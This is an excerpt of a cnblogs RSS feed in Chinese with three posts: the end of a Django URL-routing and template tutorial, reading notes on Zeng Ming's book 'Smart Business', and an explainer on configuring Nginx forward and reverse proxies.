&lt;p&gt;&lt;span&gt;&lt;em&gt;　　uuid  ：  格式化id&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;em&gt;　　sulg   ：  匹配任意ASCII字符和连字符及下划线&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h3&gt;&lt;strong&gt;&lt;span&gt;6、正则表达式&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;　　前面我们学习到路径转化器，但是有时候我们的转化器并不能够完全满足我们捕获参数的条件，像int转化器去捕获年份，如果我们传入10000，肯定会捕获呀，但不合理，因此，我们正则表达式可以更好用一些。&lt;/p&gt;
&lt;p&gt;　　使用时，首先要导入进来 &lt;span&gt;form django.url import re_path&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　参数跟path里相同&lt;/p&gt;
&lt;p&gt;　　下面看正则表达式的方法用什么捕获方式&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;第一种是分组的，在视图中根据参数名传参&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
re_path(r'plan/(?P&amp;lt;year&amp;gt;\d\d\d\d)/(?P&amp;lt;month&amp;gt;[0-9]|1[0-2])/',plan),
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　年  四位数，月  0-9 或者1和0-2&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;第二种是不分组的，在视图中安位置传参&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:false;&quot;&gt;
re_path(r'plan/(\d{4})\([0-9]|1[0-2]/',plan),
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　\d\d\d\d与\d{4}含义相同，都是四位整数&lt;/p&gt;

&lt;h3&gt;7.主路由分配给分路由&lt;/h3&gt;

&lt;p&gt;　　　　如果所有是url都在主路由下配置，那么对于检查和维护修改都会带来不便，因此我们需要将主路由分配给各个app下的路由&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;方式：include（）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　　　使用方法：先需要导入，&lt;/p&gt;
&lt;p&gt;　　　　  &lt;span&gt;from django.urls import path,include&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　使用：   eg，名为teacher的APP，将主路由分给teacher.url&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　　　&lt;span&gt;path（‘teacher/’,include('teacher.urls')）,&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　　&lt;em&gt;&lt;span&gt;　在teacher-APP中，创建urls.py(因为新建的APP没有自带url.py）&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;　　　　在teacher.url.py中，手动输入&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;　　　　form  django.urls import path&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;　　　　from .views import *&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;　　　　这里的views是此APP里的views&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;　　    　&lt;/span&gt;&lt;/em&gt;&lt;span&gt;&lt;span&gt;　include可以多级使用&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　include的原理：当遇到include时，路径就被切断，然后在include包含的分路由中开始继续检索。&lt;/p&gt;
&lt;p&gt;　　在path（‘teacher-&amp;lt;age&amp;gt;/’,include('teacher.urls')）,里面传参是可以的，就是分路由每个都要传参。&lt;/p&gt;

&lt;h3&gt;8、传递额外参数&lt;/h3&gt;

&lt;p&gt;　　当在路由中传入额外参数时，如果kwargs中key值与捕获参数不一致，按照kwargs为准。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1605636/201902/1605636-20190224191026522-210030476.png&quot; alt=&quot;&quot;/&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1605636/201902/1605636-20190224190947653-354754231.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1605636/201902/1605636-20190224191051598-869866393.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　　　如果在include后，传递的话，那么相当于此分路由各个url后都有此额外参数。&lt;/p&gt;
&lt;h3&gt;9、app_name的作用&lt;/h3&gt;
&lt;p&gt;　　&lt;strong&gt;-页面重定向&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　redirect     可以实现页面跳转&lt;/p&gt;
&lt;pre&gt;
　　　　导入  from django.shortcuts import render,redirect,reverse
&lt;/pre&gt;
&lt;p&gt;　　　　使用     return  redirect（‘网址或者路径’）&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;-reverse&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　如果给path里加入name参数，reverse（name）就等于前面路径&lt;/p&gt;
&lt;p&gt;　　　　因此实现页面跳转，可以设变量url=reverse(name的值)     然后return redirect（url）即可实现&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;-app_name&lt;/strong&gt;　&lt;/p&gt;
&lt;p&gt;　　　　那我们的name就不可以设为一样的吗？&lt;/p&gt;
&lt;p&gt;　　　　在不同app下其实可以一样，但需要使用app_name&lt;/p&gt;
&lt;p&gt;　　　　在url.py里urlpatterns前写&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;span&gt;app_name = ‘appname’  &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　　　&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　　　url=reverse（appname：name）&lt;/p&gt;
&lt;hr/&gt;
&lt;h3&gt;10、模板系统&lt;/h3&gt;
&lt;p&gt;　　　　HTML源码写到模板文件中&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;-模板路径设置&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　　　&lt;/strong&gt;在项目中创建templates文件夹，在文件夹内创建跟APP同名的文件夹&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　　　&lt;/strong&gt;主目录下settings.py中找到   &lt;span&gt;   &lt;/span&gt;     然后写入     &lt;strong&gt;&lt;span&gt;     &lt;/span&gt;  &lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
TEMPLATES = [&lt;br/&gt;{&lt;br/&gt;'BACKEND': 'django.template.backends.django.DjangoTemplates',&lt;br/&gt;&lt;span&gt;'DIRS'&lt;/span&gt;: [&lt;span&gt;os.path.join(BASE_DIR, 'templates')&lt;/span&gt;]，&lt;br/&gt;...&lt;br/&gt;　　}
&lt;/pre&gt;
&lt;p&gt;　　&lt;strong&gt;-渲染&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　在templates下写的HTML要如何使用呢？&lt;/p&gt;
&lt;p&gt;　　　　在需要使用的视图中引用&lt;/p&gt;
&lt;pre&gt;
　　　　from django.template.loader import get_template
&lt;/pre&gt;
&lt;pre&gt;
　　　　from django.shortcuts import render
&lt;/pre&gt;
&lt;p&gt;　　　使用时需要渲染，用render　&lt;/p&gt;
&lt;pre&gt;
def new(request):&lt;br/&gt;fg=get_template('student/index.html')      路径从templates往下的开始写&lt;br/&gt;html=fg.render()&lt;br/&gt;return HttpResponse(html)
&lt;/pre&gt;
&lt;p&gt;　　　　访问此视图，HTML模板即可被渲染出来&lt;/p&gt;
&lt;p&gt;　　另一种更简便的方法&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
def new(request):&lt;p&gt;return render(request,'student/index.html')
&lt;/p&gt;&lt;/pre&gt;

&lt;p&gt;这次就到这里，下一篇会深入模板变量哦。&lt;/p&gt;

</description>
<pubDate>Sun, 24 Feb 2019 15:48:00 +0000</pubDate>
<dc:creator>不打烊的热情</dc:creator>
<og:description>今天我们学习如何配置url、如何传参、如何命名、以及渲染的方式，内容大致有以下几个方面。 创建视图函数并访问 创建app django中url规则 捕获参数 路径转换器 正则表达式 额外参数 渲染方式</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/bdydrq/p/10423125.html</dc:identifier>
</item>
<item>
<title>曾鸣《智能商业》- 读书笔记 - Edison Chou</title>
<link>http://www.cnblogs.com/edisonchou/p/edc_intelligent_business_summary_notes.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/edisonchou/p/edc_intelligent_business_summary_notes.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190207185737706-272368510.png&quot; alt=&quot;&quot;/&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190207190214614-1963623061.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　《智能商业》是阿里巴巴集团前总参谋长曾鸣，对互联网时代的重要趋势做出革命性解读的作品，披露了其对于未来商业模式的思考和判断。那么，我为何会阅读一本和我的专业并不是太相关的商业（其实还是偏互联网方向）书籍呢？一是加入新公司后我的领导引用了很多关于智能商业中的概念和想法，很多我听得不是很明白的地方需要跟领导的思维同步；二是作为从做项目转向做产品方向的软件系统，我需要了解一点最新互联网的新商业思维，以应对做好产品的技术支持的准备。因此，我在2019年的春节期间购买并阅读了此书，并做了一些学习笔记于此，作为后期自我复习之用。&lt;/p&gt;

&lt;h2&gt;智能商业&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190220230124265-434515885.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　脑图浏览地址：&lt;a href=&quot;https://www.processon.com/view/5c6c0f81e4b0fa03ceb8b0e8&quot; target=&quot;_blank&quot;&gt;点我浏览&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　全篇主要围绕这一部分的&lt;strong&gt;智能商业双螺旋：&lt;span&gt;网络协同+数据智能&lt;/span&gt;&lt;/strong&gt;，这两者是相辅相成的。网络协同通过大规模、多角色、并发实时的方式，为数据智能提供&lt;strong&gt;数据压强&lt;/strong&gt;；而基于机器学习、人工智能、智能决策的数据智能，则为网络协同提供更强的能力，扩大其&lt;strong&gt;网络张力&lt;/strong&gt;，这样二者形成一个闭环，推动企业造就一个智能生态商业，这就是智能商业的双螺旋结构。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190220230704056-1269201296.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　曾鸣教授提到，只有撑起了双螺旋，这样的公司，才能突破千亿美元的市值，例如阿里巴巴和腾讯，它们能够爆发出的是&lt;strong&gt;黑洞效应&lt;/strong&gt;，有着巨大的能量场，传统商业在面对这样的对手时，几乎毫无还手之力。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190221092330719-796954857.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　企业要想实现智能化，首先要做的就是：&lt;strong&gt;核心业务在线化&lt;/strong&gt;，这也是我所在的公司在2019年的三个重要战略方针之一。通过数字化和软件化，将传统的家装服务搬到线上，这是我司智能化迈出的第一步，我们正在努力中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190220231401630-1174645925.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;商业模式变革&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190223142951932-480373510.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　脑图浏览地址：&lt;a href=&quot;https://www.processon.com/view/5c70de92e4b07fada4f0ab3a&quot; target=&quot;_blank&quot;&gt;点我浏览&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　这部分主要围绕着传统商业模式与新型商业模式的对比，首先介绍了三种经典的商业模式：B2B（代表：阿里巴巴）、B2C（代表：京东、天猫）以及C2C（代表：淘宝），然后过渡到未来的商业模式：C2B。C2B模式最突出的特征就是：客户定制，由消费者提出需求，制造者根据客户的需要进行定制，这是一种客户驱动的商业模式，是对传统三大商业模式的颠覆。&lt;/p&gt;
&lt;p&gt;　　如何实现C2B模式，传统企业该从何处做起？曾鸣教授给出三点建议：&lt;/p&gt;
&lt;p&gt;　　（1）商家要和客户能够实时互动 =&amp;gt; 这就要求企业核心业务在线化，实现网络协同&lt;/p&gt;
&lt;p&gt;　　（2）数据等于意见 =&amp;gt; 业务在线化，快速全面收集用户行为数据，借助机器学习分析数据实现智能决策&lt;/p&gt;
&lt;p&gt;　　（3）产品要快速迭代 =&amp;gt; 根据数据智能的结果反馈进行优化，以期实现深度个性化的产品&lt;/p&gt;
&lt;p&gt;　　但要将C2B落实，关键是思维的转变，应该根据用户的需求打造个性化产品，供需关系已经发生了覆变。但是，要实现C2B是一个艰难且漫长的路程，对于一些个体商户，他们怎么享受C2B的红利？他们的力量是无法做到大型企业的投入的（网络协同+数据智能双轨螺旋），曾鸣教授提出了一个“S2b2c”的过渡演化路径。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190223161039925-1648057345.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　S2b2c模式，S指供应平台，b指小商家，c指终端消费者。例如淘宝上的一个个卖家b，他们可以借助淘宝平台提供的搜索、推广、个性化、支付等能力为消费者买家c提供服务。如果这些能力服务，都让一个个淘宝的卖家自己做，基本上没几家有能力做到的，正是有了淘宝这个平台S为卖家的赋能，淘宝的卖家的商业模式就可以做到C2B：为不同的买家进行定制。&lt;/p&gt;
&lt;p&gt;　　S2b2c模式的代表企业除了淘宝之外，在《智能商业》中曾鸣教授提到了云集，一家新型商业模式S2B2C的代表企业之一。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190223215743645-198981404.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　如上图，云集负责平台S的搭建、供应链、仓储、物流、售后服务等，小b通过邀请机制进入云集App之后，即可完成开店、销售产品给终端消费者c，最终实现赚钱。当然，此模式需要小b能够自带流量或者自己找到足够的流量，并且能够提供足够差异化的服务，才能使得S2b2c在整体效能上超过大B2C。&lt;/p&gt;
&lt;p&gt;　　更多关于S2b2c模式的文章：《&lt;a href=&quot;http://www.sohu.com/a/197405375_100020651&quot; target=&quot;_blank&quot;&gt;一文看懂S2b2c模式&lt;/a&gt;》&lt;/p&gt;
&lt;h2&gt;战略变革&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190224112428352-94504104.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　脑图浏览地址：&lt;a href=&quot;https://www.processon.com/view/5c716f29e4b0f9fba68faadc&quot; target=&quot;_blank&quot;&gt;点我浏览&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　此部分内容重点在于战略层次，对基层码农来说有点远，但也可以管中窥豹，了解下高层的思维：&lt;/p&gt;
&lt;p&gt;　　智能商业带来的不只是商业模式的变革，还有战略的变革，这样公司的战略模式才可以匹配新的商业模式，才能发挥出智能商业的最大能量。&lt;/p&gt;
&lt;p&gt;　　新的战略应该是高效反馈闭环的，看十年，做一年，&lt;strong&gt;没有长期的规划，都是不停的根据实验、数据，快速的找到落地点，快速迭代&lt;/strong&gt;。在这个过程中，要控制好范围，不能因为实验影响了整个公司甚至拖垮；也要及时调整，不停的尝试，不停的转变。&lt;strong&gt;未来不知道在哪，但是可以通过高效的反馈闭环，不断调整方向，找到它&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;　　企业新的定位也要转变为&lt;strong&gt;&lt;em&gt;「点-线-面-体」&lt;/em&gt;&lt;/strong&gt;的定位逻辑，要连「点」成「线」，互动结网，逐渐的演变成一个面，进而再交织为「体」。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;「面」指的是平台，有创新模式的可能性，可以连接不同的玩家。&lt;/li&gt;
&lt;li&gt;「点」指的是面上各种各样的新角色，「点」和「面」是共生共荣的关系。&lt;/li&gt;
&lt;li&gt;「线」连接「点」、「面」和最终客户，这样才能建立关系，才能交织成网。&lt;/li&gt;
&lt;li&gt;「体」就是「点」、「线」、「面」共生，形成一个生态体系，比如淘宝。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　所以未来的企业要找对「点」，连接丰富的「线」，演变成一个「面」，最终「体」就会慢慢成型。最典型的「体」的案例就是阿里巴巴的生态体系。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190224162446448-1029948196.jpg&quot; alt=&quot;&quot;/&gt;　　&lt;/p&gt;
&lt;p&gt;　　从上图中的生态链布局来看，阿里巴巴的策略是是自己成为生态圈的核心，通过做大平台来支撑无数个小前端、通过多元的生态体系实现赋能。在这个前端布局上，阿里已经覆盖了电商、金融、企业服务、流量分发、O2O、娱乐等各个互联网场景。&lt;/p&gt;
&lt;h2&gt;组织变革&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190224165814526-1216925353.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　脑图浏览地址：&lt;a href=&quot;https://www.processon.com/view/5c7255c5e4b03334b527a8a6&quot; target=&quot;_blank&quot;&gt;点我浏览&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　对于一个企业来说，有了战略上的变革，还必须要有团队的实践，而对于团队来说，要迎接智能商业，不能在用以前的管理方式来管理新的智能商业。曾鸣教授在这里提到了一个新的核心组织方式：&lt;strong&gt;赋能型组织&lt;/strong&gt;，告别管理，拥抱赋能，让一群优秀的人能够更好的连接和协同，实现更大的价值。&lt;/p&gt;
&lt;p&gt;　　在敏捷流派Scrum团队中，期望的Scrum团队应该是一个自组织的团队，同理，对于拥抱智能商业的团队来说，应该是一个自组织的协同团队，通过强大的创新中后台（透明与共创），组织结构变为自由链接+网状协同。团队的个体综合能力会越来越强，会逐渐的摆脱KPI的约束，让听得见炮声的士兵做决策（组织架构的优化最终结果）。&lt;/p&gt;
&lt;p&gt;　　关于任正非《&lt;a href=&quot;https://www.hrloo.com/rz/14073976.html&quot; target=&quot;_blank&quot;&gt;让听得见炮声的士兵做决策&lt;/a&gt;》&lt;/p&gt;
&lt;h2&gt;案例分析&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190224232024284-337015116.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　脑图浏览地址：&lt;a href=&quot;https://www.processon.com/view/5c72b097e4b07fada4f1b63f&quot; target=&quot;_blank&quot;&gt;点我浏览&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　这部分主要是曾鸣教授关于之前讲述的智能商业的逻辑的一些辅助案例，主要介绍了淘宝和网红电商。&lt;/p&gt;
&lt;h2&gt;关于未来&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/381412/201902/381412-20190224233708366-726861062.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　脑图浏览地址：&lt;a href=&quot;https://www.processon.com/view/5c72b6e1e4b0c4e2165f5593&quot; target=&quot;_blank&quot;&gt;点我浏览&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　未来不是互联网+，而是互联网x；未来不是单纯的叠加，而是融合，企业要做的不止是连接用户，还要互动，这个过程很漫长，痛苦，而且充满不确定性。&lt;/p&gt;
&lt;p&gt;　　在这个大变革的时代，没有可以参考的梦之队，需要自己摸索，也无法通过资本快速催生，要有孕育的过程，只有不断探索，不断调整，不断迭代，才能在未来的互联网x中占有一席之地，才能生存和发展。&lt;/p&gt;

&lt;p&gt;曾鸣，《&lt;a href=&quot;http://item.jd.com/12442291.html&quot; target=&quot;_blank&quot;&gt;智能商业&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;飞雪无情，《&lt;a href=&quot;https://www.flysnow.org/2018/12/16/ai-business-notes.html&quot; target=&quot;_blank&quot;&gt;智能商业读书笔记&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;小Q成长记，《&lt;a href=&quot;https://www.jianshu.com/p/724476a6bdc0&quot; target=&quot;_blank&quot;&gt;曾鸣-智能商业20讲学习小结&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;某ProcessOn用户，《&lt;a href=&quot;https://www.processon.com/view/5c0bcd01e4b0c41f9768da8d&quot; target=&quot;_blank&quot;&gt;智能商业思维导图&lt;/a&gt;》&lt;/p&gt;

&lt;div id=&quot;Copyright&quot; readability=&quot;8.2242990654206&quot;&gt;
&lt;p&gt;&lt;span&gt;作者：&lt;a title=&quot;author&quot; href=&quot;http://www.edisonchou.cn&quot; target=&quot;_blank&quot;&gt;周旭龙&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;出处：&lt;a title=&quot;from&quot; href=&quot;http://edisonchou.cnblogs.com&quot; target=&quot;_blank&quot;&gt;http://edisonchou.cnblogs.com&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文链接。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Sun, 24 Feb 2019 15:40:00 +0000</pubDate>
<dc:creator>Edison Chou</dc:creator>
<og:description>一、关于此书 《智能商业》是阿里巴巴集团前总参谋长曾鸣，对互联网时代的重要趋势做出革命性解读的作品，披露了其对于未来商业模式的思考和判断。那么，我为何会阅读一本和我的专业并不是太相关的商业（其实还是偏</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/edisonchou/p/edc_intelligent_business_summary_notes.html</dc:identifier>
</item>
<item>
<title>Nginx的正向代理与反向代理详解 - 雪山飞猪</title>
<link>http://www.cnblogs.com/chenqionghe/p/10426084.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenqionghe/p/10426084.html</guid>
<description>&lt;p&gt;代理服务（Proxy），通常也称为正向代理服务。&lt;/p&gt;
&lt;p&gt;如果把局域网外Internet想象成一个巨大的资源库，那么资源就分布到了Internet的各个点上，局域网内的客户端要访问这个库里的资源就必须统一通过代理服务器才能对各个站点进行访问。&lt;/p&gt;
&lt;p&gt;局域网内的机器借助代理服务访问局域网外的网站， 这主要是为了增加局域网内部网络的安全性，使得网外的威胁因素不容易影响到网内，这里代理服务器起到了一部分防火墙的功能。同时，利用代理服务器也可以对局域网外的访问进行必要的监控和管理。正向代理服务器不支持外部对内部网络的访问请求。&lt;/p&gt;
&lt;p&gt;与正向代理服务相反，如果局域网向Internet提供资源，让Internet上的其他用户可以访问局域网内的资源，也可以设置一个代理服务器，它提供的服务就叫做反向代理（Reverse Proxy）服务。可以看到，反向代理服务与代理服务在功能逻辑上刚好是相反的。&lt;/p&gt;
&lt;p&gt;正向代理服务器与反向代理服务器的概念很简单，归纳起来就是，正向代理服务器用来让局域网客户机接入外网以访问外网资源，反向代理服务器用来让外网的客户端接入局域网中的站点以访问站点中的资源。理解这两个概念的关键是要明白我们当前的角色和目的是什么，在正向代理服务器中，我们的角色是客户端，目的是要访问外网的资源；在反向代理服务器中，我们的角色是站点，目的是把站点的资源发布出去让其他客户端能够访问。&lt;/p&gt;
&lt;p&gt;知道了这两个概念，就可以学习如何让Nginx服务器来提供代理和反向代理服务器了。&lt;/p&gt;

&lt;h2&gt;Nginx服务器正向代理服务的配置的3个指令&lt;/h2&gt;
&lt;p&gt;在实际应用中，使用Nginx服务器代理服务功能的情况相对少一些，Nginx代理服务本向也相对简单，涉及的主要指令不多。这些指令原则上可以出现在Nginx配置文件的http块、server块或者location块中，但一般是在搭建的Nginx服务器中单独配置一个server块用来设置代理服务。&lt;/p&gt;
&lt;h3&gt;1.resolver指令&lt;/h3&gt;
&lt;p&gt;该指令用于指定DNS服务器的IP地址。DNS服务器的主要工作是进行域名的解析，将域名映射为对应的IP地址。该指令的语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
resolver address ... [valid=time];
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;address，DNS服务器的IP地址。如果不指定商品号，默认使用53端口。&lt;/p&gt;
&lt;p&gt;time，设置数据包在网络中的有效时间。出现该指令的主要原因是，在访问站点时，有很多情况使得数据包在一定时间内不能被传递到目的地，但是又不能让该数据包无期限地存在，于是就需要设定一段时间，当数据包在这段时间内没有到达目的地，就会被丢弃，然后发送都会接收到一个消息，并决定是否要重发数据包。&lt;/p&gt;
&lt;p&gt;使用该指令的一个例子如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
resolver 127.0.0.1 [::1}:5353 valid=30s
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在实际应用中，一般不需要设置这么复杂，只要将DNS服务器的IP地址设置给该指令即可。&lt;/p&gt;
&lt;p&gt;从Nginx1.1.7版本开始，该指令支持设置多个IP地址，从Nginx1.3.1开发版本和Nginx1.2.2稳定版本开始，该指令支持设置IPV6地址。&lt;/p&gt;
&lt;h3&gt;2.resolver_timeount指令&lt;/h3&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
resolver_timeount time;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;该指令用于设置DNS服务器域名解析超时时间，语法结果为：&lt;/p&gt;
&lt;h3&gt;3.proxy_pass指令&lt;/h3&gt;
&lt;p&gt;该指令用于设置代理服务器的协议和地址，它不仅仅用于Nginx服务器的代理服务器，更主要的是应用于反向代理服务，我们马上就会谈及。该指令的语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_pass URL;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中，URL即为设置的代理服务器协议和地址。&lt;/p&gt;
&lt;p&gt;在代理服务配置中，该指令的设置相对固定，因此在这里就不介绍其他细节了，具体内容在学习Nginx服务器的反向代理服务时再重点阐述。在代理服务配置中，该指令配置为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_pass http://$http_host$request_uri;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中，代理服务器协议设置为HTTP，$http_host和$request_uri两个变量是Nginx配置支持的用于自动获取主机和URI的变量。配置代理服务时，一般不要改变该指令的配置。&lt;/p&gt;
&lt;h3&gt; 正向代理服务使用示例&lt;/h3&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
..
server
{
    resolver 8.8.8.8;
    listen 82;
    location /
    {
        proxy_pass http://$http_host$request_uri;
    }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;实现的片段很简单，设置DNS服务器地址为8.8.8.8，使用默认的53号端口作为DNS服务器的服务端口，代理服务的监听端口设置为82端口，Nginx服务器接收到的所有请求都由第5行的location块进行过滤处理。&lt;/p&gt;
&lt;p&gt;Nginx服务器代理服务使用的场合不多，从上一节的配置指令来看，功能也相对简单。在使用过程中，有一些需要注意的事项在这里说明一下。&lt;/p&gt;
&lt;p&gt;首先，我们在上面提到过，设置Nginx服务器的代理服务器，一般是配置到一个server块中，注意，在该server块中，不要出现 server_name指令，即不要设置虚拟主机的名称或IP。而resolver指令是必需的，如果没有该指令，Nginx服务器无法处理接收到的域名。&lt;/p&gt;
&lt;p&gt;其次，Nginx服务器的代理服务器不支持正向代理HTTPS站点。&lt;/p&gt;

&lt;p&gt;Nginx服务器的反向代理服务是其最常用的重要功能之一，在实际工作中应用广泛，涉及的配置指令也比较多，各类指令完成的功能也不尽相同。下面按照功能分类向大家介绍配置该服务需要掌握的指令。由反向代理服务又可以衍生出多种与此相关的Nginx服务器的重要功能，随后将逐步梳理这些功能，并提供配置实例供大家参考。&lt;/p&gt;
&lt;p&gt;Nginx服务器提供的反向代理服务也是比较高效的。它能够同时接收的客户端连接由worker_processes指令和worker_connections指令决定，计算方法为：worker_processes * worker_connections / 4.&lt;/p&gt;
&lt;p&gt;配置Nginx服务器反向代理用到的指令如果没有特别说明，原则上可以出现在Nginx配置文件的http块、server块或者location块中，但同正向代理服务的设置一样，一般是在搭建的Nginx服务器中单独配置一个server块来设置反射代理服务。这些指令主要由ngx_http_proxy_module模块进行解析和处理。该模块是Nginx服务器的标准HTTP模块。&lt;/p&gt;
